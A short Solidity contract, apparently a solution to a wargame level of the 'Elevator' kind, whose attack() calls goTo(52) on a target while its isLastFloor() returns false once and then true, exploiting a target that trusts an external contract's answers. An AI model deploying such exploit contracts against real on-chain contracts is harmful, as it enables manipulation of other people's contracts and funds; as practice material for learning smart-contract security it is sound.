// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    address public target;
    uint public count;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        (bool success, ) = target.call(
            abi.encodeWithSignature("goTo(uint256)", 52)
        );
    }

    function isLastFloor(uint256) external returns (bool) {
        if (count == 0) {
            count++;
            return false;
        } else {
            return true;
        }
    }
}
